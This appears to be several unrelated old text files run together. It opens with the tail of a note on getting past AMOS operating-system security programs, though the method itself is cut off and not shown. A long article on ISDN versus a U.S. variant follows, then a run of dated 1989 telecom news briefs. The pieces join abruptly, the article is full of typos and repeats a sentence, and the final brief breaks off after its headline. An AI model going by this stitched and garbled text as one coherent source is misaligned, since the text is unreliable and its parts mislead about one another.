confined to the security program.  The input must be typed in rapidly, or

it won't work.  This method works for both TSASS and UltraSafe.



Note:  This file is written for informational purposes oy, to give

you an idea of the workings of computer security for the Al Micro

Operating System (AMOS).  If you want more information on the inner workings of

this operating system, then get in touch with me.

PREFACE:  The integrated services digital network (ISDN) is a long-range

plan for systematically upgrading the televommunications networks of various

countries to provide both voice and data services on a single physical network.

European countries have been the major force behind degining ISDN.  The U.S.

however, will require a variant of ISDN, because its communications

industry operates in a competitive user-oriented environment.  This article

describes the differences in implementation and services that can be expected

with USDN (the U.S. version of ISDN) and identifies unresolved issues that

should concern the data communications manager.



INTRODUCTION

------------



  The ISDN proposal has recieved worldwide attention for at least a decade.

Constrained by an apathetic marketplace, technical limitations, economic

considerations, and the slow pace involved in establishing acceptable

world-wide standards, implementation of ISDN has occured principally in

laboratories only.



  The International Telegraph and Telephone Consultative Committee (CCITT)

has attempted to define and obtain general consesus regarding ISDN

objectives, interfaces, services, and standards.  The CCITT-backed ISDN

principally represents European interests.  Although the U.S. is repre-

sented in the CCITT and offers support for its programs, the major

telecommunications organizations in the U.S. are more interested in estab-

lishing their own standards and programs.  So, while ISDN seems to be

gaining more U.S. support, it continues to reflect a European perspective.

Recently, the term USDN has been used to distinguish the modifications to

ISDN that are expected to evolve in the U.S.  The USDN concept is one of

integrated access to multiple networks, rather than the integrated services

on one network approach of the ISDN proposal.



  The U.S. telecommunications industry has long recognized that ISDN would

have a somewhat modified personality in the U.S. Several industry-wide

ISDN conferences addressed the U.S. equivalent to ISDN, but none of the

conference comittees proposed that the U.S. adopt ISDN totally, be-

cause of the unique characteristics of the U.S. communications environment.



THE U.S. COMMUNICATIONS ENVIRONMENT

-----------------------------------



  The unique U.S. communications industry characteristics that influence

the USDN effort are described in the following section.  These characteristics

are summerized in Table 1, which compares the U.S. communications environment

with the environment in other countries.



  The Competitive Marketplace:  In the U.S., the privately managed telephone

industry responds, rapidly to user demands for new services.  In most other

countries, however, services are established in a slow, deliberate program

by one government-administrated source, usually the country's postal,

telephone, and telegraph (PTT) agency.  The users then decide if and how

they will use the services offered.



  Technology Advances:  Second only to the competitive marketplace, technology

advances include component developments such as as memory devices, VLSI

chip design, and optical elements.  Developments in the system architecture,

networking, and functional interfaces in transmission and switching

technologies are equally important in defining the USDN concept.



  Less Restrictive National Standards:  Because standards imply conformity,

they can restrain innovation.  Because they are not required to undergo a

lengthy standards-approval cycle, U.S. manufacturers are free to produce

systems that are incompatible with existing equipment.  De facto standards

are often established by the market's acceptance of a particular system.

  Multiple Carriers and Competative Networks:  The premise of ISDN is that a

common national network will evolve, able to handle multiple voice and data

services in an integrated fashion.  ISDN thus precludes a carrier by-passing

a local office or vying for customers' traffic through innovative techniques.

In most countries other than the U.S., telephone companies are not legally

required to provide or counter new service offerings.  Integrated digital

networks (IDNs) are emerging in the U.S. that provide digital access and

transmission, in both circuit-switchhed and packet modes.  The number of

IDNs will probably increase regardless of whether an ISDN is proposed for

the U.S.



  Embedded Investment:  The U.S. has invested heavily in modern stored-program

controlled (SPC) switching.  However, other countries are only now facing

conversion to SPC, as much of their existing systems investment is

greatly  depreciated.  These countries can therefore converty to ISDN

switching in a more orderly and economical fashion that the U.S. can.  Thus

the U.S. will have overlay networks, digital adjuncts to existing SPC

switches, and multiple networks in the foreseeable future.



EVOLUTION OF U.S. COMMUNICATIONS OFFERINGS

------------------------------------------



  The American solutions to data transmission problems have tended to be

faster, more practical, and less elegant than those evolving in Europe.

Not surprisingly, the American solutions have generally ignored  CCITT

recommendations.  For example, public packet-switched networks such as TYMNET,

GTE Telenet, and Satellite Business Systems are offered to some customers

with long-haul traffic.  These systems were severly limited because they

often required access through analog local office.  Many major industries

and private organizations thus established their own data networks, often

point to point over leased circuts.  Digital Terminating Service was

introduced to provide 56K bit-per-second (up to 448K bit-per-second)

links to the end user over special transmission links.  Digital Electronic

Message Service was recently approved to provide 1.5M bit-per-second service

to the end user.

  Some suppliers are now offering PBXs with 64K bit-per-second local loops

and direct pulse code-modulated (PCM) trunks to the public network.  Two

new standard 1.544M bit-per-second central office-to-PBX interfaces have

been established, the Northern Telecom Computer-to-PBX-interface and

the AT&T Information Systems Digital Multiplexed Interface.



  The Development of Local Area Networks:  The increasing use of data

terminals and the growth of distributed processing has led to the necessity

of transporting data at rapid rates within a building or local area.

This rapid local data transmission imposed impossible requirements on the

conventional PBX.  While PBX designers struggled to upgrade their data

capabilities, computer manufacturers saw the oppertunity to offer local

area networks (LANs) designed specifically to provide wideband data transport

between users in a limited area.  Again, expediency and the competitive

climate produced a practical solution - several LANs with different

architectures and protocols.   In general, these LANs so not conform to the

ISDN protocol levels identified in the International Standards Organization

(OSI) models.  However these LANs cannot be eadily replaced, so the USDN

will have to accommodate them.

  A case in point is the apparent conflict between the ISO model of Open

System Interconnection (OSI) and the IBM System Network Architecture (SNA).

The OSI model of a seven-layered architecture for data networks has been

defined for the first four layers only.  International agreement on the

remaining protocols will take several more years to obtain, if agreement on

the remaining protocols will take several more years to obtain, if agreement

is possible, Meanwhile, in the U.S., IBM defined a similar protocol, SNA,

and has implemented numerous networks.  Long before any ISO standard can be

established, the U.S. will be well populated with SNA systems.  The USDN

must be at least compatible with SNA, and SNA could become the national

standard.

  Because future PBXs will probably be able to switch synchronous data at

64K bits per second (and multiples therof, up to at least 1.544M bits per

second), there may not be sufficient switched wideband traffic requirements

to support a seperate LAN standard.  Long-distance dedicated data services

such as AT&T's ACCUNET and SKYNET are competing for data traffic.  In

addition, various data-over-voice (DOV) schemes have been employed over

switched analog circuts.  In short, many approaches, services, and facilities

have already been implemented to satisfy the immediate market needs, without

regard to an orderly transition to ISDN.  Thus, the USDN will have to

accomodate thesee established services and inteface with most of them.



  Introduction of Local Area Data Transports:  Recently, electronic (carrier)

serving areas have been replacing long local physical loops.  These

subscriber carrier systems provide such data capabilities as DOV and local

area data transport (LADT).  LADT offers a packet-switched data capability

that may apply to both business and residential services;  its low speed

(up to 4.8K bits per second) and relatively low cost may make it universally

attractive.  LADTs may find widespread use for Videotex, meter reading,

power load shedding, security reporting, and marketing transactions.

  Although LADT is restricted primarily to a local exchange area, the

evolving USDN will provide transport between LADTs.  LADT subscribers will

access the USDN transport carrier through pooled local data concentrators.

A typical LADT Data Subscriber Interface (DSI) unit will concentrate data

from 124 subscribers to a 56K (or 9.6K) bit-per-second trunk to a packet

network.  A subscriber can thus dial up a DSI over a conventional voice

loop and transport data through a modem (which may be a part of the

terminal) by means of the switch.  A direct access mode is also available

with the subscriber loop terminating on the DSI, permitting independant

simultaneous data and voice transmission.  The X.25 link access protocol-

balanced (LAPB) is used, but protocol conversion is restricted in many

instances by federal rules.  Although LADTs so not comply with any defined

ISDN service, they are an integral requirement of the USDN.



  CSDC Technology:  Circut-switched digital capability (CSDC) is another

USDN service that has no ISDN counterpart. CSDC is an alternative voice-

or data-switched circut with end-to-end 56K (or 64K) bit-per-second

transparent connection ensured by dedicated trunk groups in each

switching location.  CSDC facilitates large, continuous, bulk data trans-

fers, and its implementation requires added investment in each switch

location as special terminal equipment.  CSDC represents yet another

expediant toward providing ISDN-like services while using existing investment.

CSDC technology can also accomodate a full ISDN, if one ever evolves in the

U.S.



  Digital Subscriber Loops:  ISDN-compatible digital subscriber loops (two

voice, plus one data channel at 144K bits per second) are recieving attention

in the U.S., but the commercial implementation of this technology is not

prograssing rapidly.  Near-term subscriber loops will probably acquire data

capability by data ober analog voice multiplexing.  Although this step

would not precluse the eventual inclusion of ISDN loops, it would tend to

slow their introduction and widespread acceptance.



  Interfaces and Protocols: Although the ISDN revolves around the 30 channel

PCM transmission format used in Europe, it does provide for the 24 channel-

based systems used in the U.S.  However, U.S. systems have many unique

interface requirements.  A new set of proposed services will require

forwarding of the calling number for control or processing by either the

terminating switching system or the called subcriber.  Exchange of such

information will likely be accomplished over a local area common channel

signaling system or a fulll CCITT standard, signaling system #7 network.

  Direct data exchange between a network switching unit and a sata bank

and/or processor facility will probably evolve from the current trunking

scheme to a direct signaling carrier, perhaps CCITT standard #7 with OSI

and/or SA protocols.

  Calls to cellular mobile roamers (i.e., mobile units that have traveled

outside their base area) will probably be routed to a central data base for

locating routes.  A personal locator service for automatically routing calls

to the unit's temporary location will require unique system interface and

protocols.  Privately owned transaction networks may provide this unique

interface.  While the objective is to eventually use CCITT standard #7 as a

vehicle and X.25 as an interface protocol, the USDN must embrace a wide

assortment of formats, protocols, and interfaces for the near future.



TRANSMISSION TECHNOLOGY TRENDS



  Ultimately, subscriber loops in the U.S.  will be digital, providing two

64K bit-per-second voice or data channels (i.e.,two B channels) and one 16K

bit-per-second voice or data channels (i.e., two B channels) and one 16K

bit-per-second data only (i.e., one D channel).  The 16K bit-per-second

channel will probably permit an 8K bit-per-second user data channel or

submultiplexed channels of a lower bit rate.  Full-duplex (i.e., four wire)

operation will be provided by echo-canceling techniques over existing

two-wire loops.  An alternative approach of time-domain multiplexing may

also be used, especially in the neat term.





  Local Loops:  Although modems will not be required at either end of the

local loop, network terminating equipment will be required to serve as the

multiplexor and, perhaps, as voice CODECs.  Users of such circuts can have

full, simultaneous, reall-time voice and data channels, as well as seperate

control, metering, and low-speed data transmission.  With advanced

switching centers, each circut can be routed and billed independently.

Existing 56K bit-per-second channels on conventional 24-channel digital

carrier systems will be replaced by or supplemented with 64K bit-per-second

clear channels with extended framing.

  The local loop plant in many areas is already migrating toward carrier-

serving areas, implemented by a subscriber carrier capable of digital

transmission.  Some local telephone companies are installing glass fiber in

their local plants in preparation for the downward migration of direct

digital transmission.  However, until full, ISDN-type local loops are

universally available, near-term adaptations will be offered to satisfy

market needs and to prevent users from seeking other communications

facilities.



  Wideband Circuts:  Wideband circuits (i.e., multiples of 64K bits per

second) over the public switched network may become feasible as newer

switching elements are used.  Although some transmission links may soon

be able to combine DS-O channels for real-time wideband service, limitations

in switching centers will restrict their general use.  Seperate wideband

switching modules, multiplexing on CATV, or extension of wideband LANs may

ultimately appear if the need for wideband transmission remains strong.



  Packet Transmission:  Packet transmission is an inherent element of the

ISDN.  However, the USDN must handle separate packet networks, separate

facilities, separate routing, and even separate providers.  It is unlikely

that American packet networks in the U.S. will ever be combined into an

integrated, single-network ISDN.  Therefore, the USDN must accommodate such

overlay networks and the associated problems of routing, protocol conver-

sion, circuit maintenance, billing, and network management.  American users

will demand and recieve more options for data transport, data processing,

and support services than any single network is likely to provide.



SWITCHING TECHNOLOGY TRENDS



  Implementing ISDN standards on the switching systems already in place

throughoout the U.S. is a formidable task.  Most local end offices have

been replaced by SPC analog switches within the past decade.  More recently,

SPC digital switches have been installed, and this trend will probably

accelerate through the 1990s.  However, these newer switches are third-

generation design; that is, they are designed primarily to handle conventional

voice circuit switched traffic within a hierarchical network.  These switches

are not optimized for data handling, multiple networks, or sophisticated user

needs.  Although hardware retrofits and software patches are being applied to

accommodate LADT, CSDC, and digital loops, such solutions result in limited

user services, higher costs, and more complex maintenance requirements.



  Fourth-Generation Switching:  Fourth-generation switching systems, design-

ed for USDN requirements, are beginning to appear.  A fourth-generation

switch is optimized for data; voice switching is simply a special case of

data transmission at speeds of 64K bits per second, 32K bits per second,

or any other evolutionary compressed voice bit rate.  Fourth-generation

switches do not have central processors.  Each functional unit (e.g., lines

or trunks) contains its own processing hardware and software to output

packet-format messages (i.e., containing a header message and a data byte)

in a uniform deferred format.  (The data byte may be a digitized voice sample.)

These packets then are routed through a central matrix, which also contains

sufficient processing power to route packets to their interim or final

destination with only the data contained in the header bits of the call

itself.

  Services such as route translation, tone reception, billing recording, and

termination functions are inserted into a call in progress by routing the

call packets to specific functional modules on demand.  The modules perform

the required call functions and return the packetsto the matrix. (or interal

network).  When the required call-handling functions have been sequentially

accomplished, the call is terminated to the desired port and a virtual

circuit is established between the calller and called terminals.  During

the call, the packet header provides control and supervision and performs

routine maintenance and alarms.

  A fourth-generation switch performs required functions-Centrex attendants,

toll operators, common-channel signaling, or LAN termination-when the

appropriate module is simply plugged in.  These functions do not affect

existing system service or capacity.  Ideally suited to the USDN, the fully

distributed  control architecture of a true forth-generation switch

could also meet the longer-range objectives of the ISDN.

  Because they do not require a large, costly central processor complex,

fourth-generation switches can be economically applied as add-on units or

adjuncts to existing SPC switches.  Fourth-generation switches thus provide

advanced capabilities without the necessity of replacing or retrofitting

the existing switches.  Some features that can be provided as adjuncts

are described in the following paragraphs.



  Special Services:  In the U.S., services that require more sophisticated

transmission that provided by standard telephone lines are expanding rapidly.

By the end of the 1980s, 50 percent of all lines may require some special

treatment.  A USDN switch, or a special service adjunct can provide univer-

sal line circuits that can be remotely administered for transmission

balance, type of transmission, routing, and signaling.  The special service

adjunct can provide various voice and data arrangements and automatic

facilities testing as well as provide and maintain sophisticated data and

voice services, often without changing the user's original telephone number.



  Business Services:  Integrated toll, local, Centrex, PBX, and instrument/

terminal systems are not provided in the U.S. because of its regulatory

climate.  Regulations controlling enhanced services, authority to provide

services, equal-access provisions, and franchising of special carriers and

servers all affect the USDN but are constraints in the ISDN plans.  Because

of the uncertainty and ambiguity in such regulatory matters, the business

services adjunct can be used with less economic risk than replacing or

retrofitting existing switching systems would incur.  The business services

adjunct permits the existing local office to continue providing the local

telephone service for which it was optimized.  The business services

adjunct can also economically provide such features as:

    *  Citywide, Centrex-like service with universal numbering among user

       locations.

    *  Centralized attendants and night service

    *  Direct data lines at 64K bits per second

    *  Rerouting of existing PBX trunks with improvement in features

    *  Lan termination for PBX-to-Lan connections and LAN-to-LAN bridging.

Feb. 17-19, 1989

SATELLITE USE WILL KEEP SOARING:



   Satellites and fiber-optic cables will be used for

international communications well into the 21st century, according

to a Communications Satellite Corp. study. The study suggests that

services using satellite systems could be up to 45% less expensive

than international transmissions that use fiber. Also giving

satellites staying power: Ability to reach remote areas.



RCI SENDS CALLS OVER THE WATER:

   RCI Long Distance, a subsidiary of Rochester Telephone, said

Thursday that it has added 122 countries to its international

service, including popular calling areas such as West Germany and

Israel. Rates: RCI says only that the service will be priced

competitively with other carriers offering international services.



PROGRAM PUTS NETWORK ON THE MAP:

   A computer program from Connections Telecommunications can be

used by network designers to create a visual map of their

wide-area network, reports Computerworld magazine. The program,

called Mapconnect, will superimpose over a map of the USA the

serving office, hubbing point and area sites with their

connections. Cost: $2,000 per copy, plus $400 annual maintenance

after the first year.



CALIFORNIA, MORE FIRMS COMPETE:

   Competition for local access and transport area data

transmissions to long distance carriers has been strengthened in

California by a recent PUC decision. The commission approved a

deregulation plan that will likely have MCI, US Sprint and Cable

and Wireless Management Services competing with Pacific Bell and

GTE California, says CommunicationsWeek.



VERMONT TO UPGRADE TELE SYSTEM:

   The State of Vermont will be getting technical support for

improvements in its telecommunications network from Federal

Engineering Inc., according to CommunicationsWeek. Contract value:

Not revealed. Federal Engineering has provided similar service in

Montana, New Mexico, North Dakota, Virginia and Wyoming.



CAMPUS GETS BIG DOSE OF HI-TECH:

   Southwestern Bell is putting more than 40 miles of high-speed

fiber optics into the St. Louis Community College system, reports

CommunicationsWeek. The network will link the school's 3 campuses

and headquarters to provide video, voice and data transmissions

for educational programs. Cost to the school: $580,000, plus

$2,000 per month to use the system.



SOMEONE MIGHT BE LISTENING:

   About 30 hours worth of recorded audio-visual material was

recorded by New York City residents recently for transmission into

outer space, reports InfoText magazine. AT&T set up the free

service at its headquarters. Messages were beamed into space on

the company's satellite dishes. Among the messages: A young

student reported on a pro basketball game for any interested

"aliens."



-------------------------------------------------------------------------------

Feb. 20, 1989

AT&T PLANS OVERHAUL:

   AT&T announced a sweeping overhaul Friday designed to make the

long-distance company more competitive and profitable. AT&T will

split its 5 business groups into 12 units to 25 units that each

will have sole responsibility for a product or service. The idea

will be phased in over a period of months this year. (For more,

see special AT&T package below. From the USA TODAY Money section.)



JAPAN SET FOR JUNGLE LAUNCH:

   The first of 2 satellites for the Japan Communications

Satellite Co. lifts off Feb. 28 from a jungle launch pad in French

Guiana. The launch will inaugurate commercial satellite

communications in Japan and be the first of Hughes Communications'

new HS 393 series. The satellite will begin serving the Japanese

islands, including Okinawa, after a 30- to 60-day testing period.



SATELLITE HAS MANY CUSTOMERS:

   The JCSAT 1 satellite going into orbit on Feb. 28 will provide

the Japanese islands with various new services. Scheduled to come

off the satellite: Network and cable TV distribution, used-car

auctions, prep school classes, religious programming, automobile

dealer training, a specialized engineering video network. Also: A

business group plans to offer business communications.



BIG SATELLITE WON'T BE THE LAST:

   With a deployed height of 10 meters, the Hughes Communications'

satellite being launched by Japan next week will be the largest

Hughes commercial satellite ever launched. It contains 32

transponders, each one capable of transmitting one TV channel, 45

million bits of data per second, or more than 250 telephone

circuits. Japan will launch a second satellite this summer.



SPACE STATION MAKES AUDIO PLANS:

   NASA has chosen Harris Corp. audio communications systems for

use on the space station Freedom, scheduled for operations in

1995. CommunicationsWeek says that under a $35 million subcontract

with Boeing Aerospace, Harris will design, develop and produce

systems for onboard use. Special feature: At times when crew

members have their hands busy, a voice recognition capability will

be available.



CHINA SPRINTS FOR THE MICROWAVE:

   About 90% of its surplus microwave network has been sold or

dismantled by US Sprint, according to CommunicationsWeek. The old

equipment is being replaced by a fiber network. Most recently, the

People's Republic of China spent about $15 million for 6,000 used

analog microwave radios and 600 parabolic antennas. China plans to

use the equipment on 11 existing microwave networks.



NYNEX BEGINS ANOTHER TEST:

   Nynex is providing a digital data-over-voice private-line

access service for Telenet Communications in a New York City field

trial. It is one of 35 basic service elements Nynex specified in

its Open Network Architecture plan for the FCC, reports

CommunicationsWeek. Nynex expects to present 14 other new

offerings before the end of the year.



BOSSES GET MORE RESPONSIBILITY:

   The reorganization plan announced by AT&T Friday is the first

major policy move by Robert E. Allen since he took over last April

as chairman. The goal: Get managers to focus more on customers and

on costs by giving them total responsibility for any money they

make or lose. Right now most of that responsibility is held by top

managers at AT&T.



AT&T HOPES FOR BIGGER SALES:

   The AT&T move to split its business groups comes at an

opportune time. AT&T is losing market share in the long-distance

phone market to rivals MCI and US Sprint. Also: AT&T's overall

sales growth has been modest over the last several years. Under

the new plan, the presidents of AT&T's 5 operating groups will be

renamed group executives. The new units will operate as

independent businesses.



NEW APPROACH MIGHT START SLOWLY:

   Analysts say it will take years to streamline AT&T's

bureaucracy and get managers accustomed to being directly

accountable for the performance of their businesses. AT&T reported

a loss of $1.67 billion on sales of $35.21 billion in 1988.

Earnings were reduced by a net charge of $3.94 billion from

writing off old equipment and accelerating modernization of its

long-distance network.



-------------------------------------------------------------------------------

Feb. 21, 1989

DATA CROSSES MILES WITH SPEED:

   Northern Telecom yesterday announced the availability of the

High Speed Data Module, a data connectivity device that is an

addition to the Meridian SL-1 Data Services product line. A

typical application might involve a bank that uses the module to

connect a programming facility with the bank's main data center,

located approximately 400 miles away. Cost: $725.



INMATES TOUCH, SAVE AND LOSE:

   Some 15 inmates from local prisons in the Nashville, Tenn.,

area face computer fraud charges after figuring out Touch & Save

long-distance phone customers' user codes. Officials say the

inmates charged more than $2,000 in calls. The inmates gained

access to the codes and sold them for $5 or more to others in the

prison. (From the USA TODAY News section.)



PRODUCTS WILL PROTECT DATA:

   CompuServe Inc. has introduced new encryption products for its

public packet data network, Network World reports. The encryption

services let users move data from expensive leased lines to

cost-effective dial-up public circuits, while protecting the data

from unauthorized access. The cost ranges from $1,495 to $8,100.



PROTEON UNVEILS FIBER MODEM:

   Proteon Inc. has developed a single-mode, fiber-optic modem

that will extend the distance between 2 nodes on a token-ring

network, says Network World. The p3282 modem permits 2 nodes to

communicate over a maximum distance of 30 kilometers without using

a repeater. The fiber also uses optical laser technology instead

of LEDs for transmission of the signal. Cost: $10,000.



NETWORK CHARGES ARE DROPPED:

   Transettlements Inc. has stopped making additional charges for

internetwork transmission, reports Computerworld magazine. The

firm will no longer charge its users fees, penalties or premiums

for interconnection with other value-added networks. The charge

for going through 2 networks will be the same for going through

only Transettlement's network.



AIRLINES, HOTELS JOIN NETWORK:

   GEnie, a consumer online information service from GE

Information Services, is now offering the Official Airline Guide

Electronic Edition Travel Service. The edition will permit GEnie

subscribers to view airline schedules, fares and hotel

information. Cost: A surcharge on GEnie of 17 cents/minute during

non-prime hours and a surcharge of 47 cents/minute during prime

time.



RESERVATIONS ARE A TOUCH AWAY:

   Harrah's Reno introduced a guest service center at the Reno

Airport yesterday that uses interactive, live video to streamline

guest reservations. Guests can check into Harrah's, make dinner

reservations and arrange to see a show by touching a TV screen.

The system uses Nevada Bell's new ISDN network that allows voice,

data and video communications to use fiber optic wires

simultaneously.



-------------------------------------------------------------------------------

Feb. 22, 1989

PHONE USERS DO IT THEMSELVES:

   US West's 35,000 Bellingham, Wash., customers will test the

first of what could be a major telephone innovation:

Instantaneous, do-it-yourself phone service. In the plan, a person

could shut off service, have a 3-way holiday conversation and have

calls sent to work - all by dialing a series of numbers. (For

more, see special Phones package below.)



SATELLITE TO SERVE INDONESIA:

   Scientific-Atlanta has been selected to supply a half dozen

major communication systems in the Pacific Rim: A VSAT satellite

link for Indonesia and 5 private television networks for Japanese

firms. The satellite network will provide interactive data, video

and voice communications to as many as 4,000 sites on the 13,677

islands that make up the Republic of Indonesia.



NETWORKS TO GO ON NEW SATELLITE:

   Nippon Telephone & Telegraph Co. of Tokyo and 4 other Japanese

companies said yesterday they will use Scientific-Atlanta's B-MAC

satellite technology to establish 5 private business television

networks in Japan. When their private television networks are

completed, Nippon, Nikken, Telecom Sat and Video Sat plan to send

video signals to JC-Sat, Japan's new communications satellite.



TELCO ENTRY IS UNPREDICTABLE:

   Congress will probably not address the issue of telephone

companies entering the TV business in the near future, National

Assn. of Broadcasters President Eddie Fritts tells Broadcasting

magazine. He says the telco entry will be one of the top issues of

the 1990s. But he stops short of making predictions, saying only

that free over-the-air broadcasting will survive.



MORE STATIONS PICK UP SATELLITE:

   Satellite-delivered talk-radio programs are growing as AM

station directors look more closely at the potential of

low-maintenance, national talk shows. Broadcasting magazine says

the 3 month-old American Radio Networks joined the field with 22

affiliates and now has 110 stations receiving its 24-hour

satellite service.



SATELLITES FLY FOR GERMAN TV:

   Highly competitive satellite and cable TV services are expected

to grow significantly during the next 2 years in West Germany,

according to Broadcasting magazine. West German private TV channel

RTL Plus, a satellite-to-cable service, is expected to expand its

market to 10 million viewers. U.S. firm Capital Cities/ABC has a

holding in Tele-Munchen, part owner of the Tele5 satellite

channel.



 SPECIAL PACKAGE ON PHONES:

 -------------------------

SERVICE COULD START IN A SNAP:

   Customers moving into new homes could start phone service

within minutes by dialing telephone responses to a series of

computer-voiced questions with a new service being tested by US

West Communications. Officials liken the change to the switch from

operator-assisted to direct-dial local calls in the 1920s or the

similar change in long-distance calls in the 1950s.



SERVICE COULD LINE THE WEST:

   If an upcoming test of do-it-yourself phone service works in

Bellingham, Wash., another 2-year test will be done on the same

service in a larger market, such as Denver. If that also goes

well, the entire US West market - 14 states - will get the new

system by the year 2000. Throughout the test, all customers still

will be able to use their telephones as they now do.



FEATURES ARE A BUTTON AWAY:

   US West customers with do-it-yourself service will be able to

start or stop telephone feature services at any time, including

such commonly used services as call forwarding and 3-telephone

conversations. These services already are available, but only by

calling US West sales representatives during daytime business

hours. The new system will allow changes to be made at any time.



-------------------------------------------------------------------------------

Feb. 24-26, 1989

CELLULAR SIGNAL GOES FARTHER:

   Pacific Telesis has installed antennas at both ends of an

Oakland, Calif.-area tunnel to carry signals from cellular car

telephones, reports Forbes magazine. Also: PacTel is using a solar

cell to power a repeater signal and extend coverage into Laguna

Canyon. Forbes says the developments are indications of coming

improvements in cellular transmissions.



THE AIRWAVES ARE CROWDED:

   The main problem for cellular phone users in large metropolitan

areas is the addition of new subscribers to already jammed

cellular systems, reports Forbes magazine. The FCC has allocated

only 437 channels of radio waves to each carrier. To add

customers, systems have been subdividing cells, with each cell

having low-power antennas that operate in limited boundaries.



SENDING COSTS WOULD BE HALVED:

   Digital cellular technology could solve the problem of cramped

airwaves for cellular telephone systems, reports Forbes magazine.

With digital, ordinary radio interference is eliminated,

conversations are private, data from laptop computers can be sent

to the office from the road. Also: Digital cellular would cost

about half the transmission price because it's twice as fast.



LOYOLA PLANS FOR ISDN USE:

   AT&T recently said that the Definity 75/85 communications

system will be the base for an Integrated Services Digital Network

that will carry voice, data and images for Loyola University.

Computerworld says Loyola is expected to be the first commercial

customer to use Definity. By early next year about 7,000 phones on

the 3 Chicago-area campuses will be on the system.



TELENET LINKS WITH STRATACOM:

   Telenet Communications has made an agreement with Stratacom

Inc. to develop the technology for what the companies said will be

the first broadband Integrated Services Digital Network service to

be based on the ISDN frame relay interface, reports Computerworld.

Telenet, a subsidiary of U.S. Sprint, will integrate packet

switches with Stratacom digital multiplexers.



THE PHONE IS IN THE BANK:

   Banks are playing it smart with their money and are winning

price concessions from telephone companies by pitting carriers

against one another, reports Network World. Some banks are

negotiating for new services; others are cutting costs by striking

custom contracts with local carriers. Example: Irving Trust of New

York used MCI and AT&T to get a new international calling service.



CIA HELP IS NO SECRET:

   The CIA linked its electronic-mail systems together with the

help of Soft-Switch, a company in Wayne, Pa., that specializes in

connecting multivendor E-mail systems, reports Government Computer

News. A key function of the software package: Directory services

that maintain information on all mail systems directly or

indirectly connected to the software.



FCC GETS COMPLAINT ON PACBELL:

   Conference-Call USA, based in Chicago, has filed a complaint

with the FCC, accusing Pacific Bell of refusing to change its

practice of automatically routing all conference-call traffic to

AT&T, reports CommunicationsWeek. The firm says the practice is

stunting the growth of competitive companies.



STUDENTS ARE ON THE PHONE:

   School children in Denver are using computers and transmission

facilities from US West Advanced Technologies to communicate with

teachers, special subject experts and other students.

CommunicationsWeek says the equipment will be given to the school

system at the end of the school year. US West is using information

gained from the trial to plan an information gateway in Omaha,

Neb.



HEARING IMPAIRED CAN MAKE CALLS:

   The State Relay Center is scheduled to begin service Friday in

Birmingham, Ala. The new relay center was created to link

hearing-impaired customers by teletype to people they want to

call. The service is funded by a small surcharge on all phone

bills in the state.



-------------------------------------------------------------------------------

Feb. 28, 1989

CALLERS MUST BE TOLD THE COST:

   The FCC yesterday ordered 5 companies that charge customers 20%

to 80% more than AT&T, MCI or Sprint to toe the line. The

alternative operators must now tell callers how much the call will

cost and which company is placing it before it goes through. The

high rates usually are placed on hotel, airport or hospital

phones. (From the USA TODAY News section.)



FIRMS GIVE A PART OF REVENUES:

   The phone companies told by the FCC yesterday to reveal costs:

Central Corp., International Telecharge Inc., National Telephone

Services Inc., Payline Systems Inc. and Telesphere Network Inc.

Right now all these companies buy phone time from a major carrier

such as AT&T and MCI and then give the hotel, airport or hospital

that uses the service a cut of revenues from every call.



CALLERS WILL GET MORE RIGHTS:

   The FCC said yesterday that alternative long-distance operators

must: Put a sticker on the phone with price information or tell

the caller the price verbally; give callers an chance to hang up

without any charge; offer callers a chance to go through AT&T or

another phone service. Right now many alternative operators stop

you from using another carrier.



NISSEI PLANS A FAX EXPANSION:

   Portable facsimile machine manufacturer Nissei says that a

major expansion of its operations will be completed within 2

months. To come: As many as 5 new fax machines, a revamping of the

field staff to cover all sales territories. Also: Vice President

John Haggerty says Nissei will move into other areas of the retail

information technology market.



BELL GOES TO COLLEGE:

   Bell Atlanticom Systems said yesterday it has signed a contract

with the College of William and Mary in Williamsburg, Va., for a

fully integrated voice and data communications system. The

campus-wide system will provide resale of communications services

to students, a management system, and a universal wiring plan to

provide voice and data transmission.



SYSTEM INCLUDES TRUNKS, LINES:

   The communications system obtained by the College of William

and Mary yesterday will provide 300 trunks, 3,800 faculty and

student lines, 150 voice/data faculty users and 1,050 host data

ports. It includes more than 5,000 inside wiring runs and several

miles of fiber optics. Also included: A 1,000-user Aspen Voice

Mail System and the Alex-IS Telecommunications Management System.



MESSAGES GO AROUND THE GLOBE:

   GE Information Services has announced a new capability of its

QUIK-COMM System (electronic mailbox service) which enables users

to send QUIK-COMM messages to facsimile machines throughout the

world. Receiving fax machines must be Group III facsimile

terminals that conform to CCITT standards. Recipients do not have

to be QUIK-COMM System subscribers to receive the fax document.



MCI GETS THE INSURANCE:

   Northwestern Mutual Life Insurance Co. said yesterday it has

selected MCI Communications to replace AT&T's data network with a

nationwide data communications network linking Northwestern

Mutual's Milwaukee-based home office with its remote general and

district agency offices. The 3-year, multimillion dollar agreement

will eventually link more than 200 agency offices.



BELLSOUTH GETS CLOSER TO EUROPE:

   BellSouth Corp. has signed a definitive agreement to purchase

Air Call Holdings' shares in Air Call Communications, providers of

cellular, paging and telephone answering and telemarketing

services in the United Kingdom, Ireland and continental Europe.

BellSouth provides mobile systems services in the USA, Argentina,

Australia, Ireland and Europe.



SYSTEM OFFERS NEW OPTIONS:

   New networking and programming capabilities for the McDonnell

Douglas REALITY Operating System are being scheduled for beta

testing at several customer sites, the company said yesterday.

Dubbed ROS 7.0, the system will offer capabilities previously

unavailable in PICK systems. Also: Data and processing can be

distributed transparent to users and, in cases, the programmer.

March 3-5, 1989

PHONE LINES ARE SIMILAR:

   The USA's major long distance phone services aren't that

different. A comparison of AT&T, MCI Communications Co. and Sprint

Communications Co. in the March Data Communications magazine

found, for instance: Calls placed over Sprint lines were slightly

louder than those placed over AT&T or MCI lines. All the calls,

however, could be heard clearly. (From the USA TODAY Money

section.)



SPRINT WAS MOST ACCURATE:

   A study by Data Communications magazine says AT&T connected its

calls more quickly than other carriers. On average, it took 9.8

seconds to connect an AT&T call; 12.9 seconds for Sprint; 13.7

seconds for MCI. Also: Sprint had the fewest foulups. Only 2.3% of

the calls on its lines failed to go through on the first try; 4.9%

for AT&T; and 7.3% for MCI.



CRITICAL FIRMS CALL SURVEY FAIR:

   When information was sent from one computer to another over

phone lines during a study by Data Communications magazine, AT&T

had the fewest glitches. Next best: Sprint, then MCI. The magazine

placed 150-180 calls over the trio's phone lines between 4 cities

last fall. Companies response: All had criticisms of the

comparison but, overall, said results appeared to be fair.



PHONE FIRM ELIMINATES CHEMICAL:

